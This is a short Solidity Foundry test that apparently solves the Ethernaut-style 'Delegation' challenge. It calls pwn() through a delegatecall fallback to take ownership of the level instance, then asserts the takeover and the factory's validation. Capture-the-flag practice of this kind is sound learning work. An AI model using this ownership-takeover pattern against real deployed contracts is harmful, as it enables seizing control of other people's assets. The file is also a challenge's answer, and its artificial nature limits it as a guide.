// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./DelegationFactory.sol";

contract DelegationTest is Test {
    DelegationFactory factory;

    function setUp() public {
        factory = new DelegationFactory();
    }

    function testDelegation() public {
        address delegation = factory.createInstance(address(this));

        Delegate(delegation).pwn();
        assertEq(Delegation(delegation).owner(), address(this));

        assertTrue(factory.validateInstance(payable(address(delegation)), address(this)));
    }
}
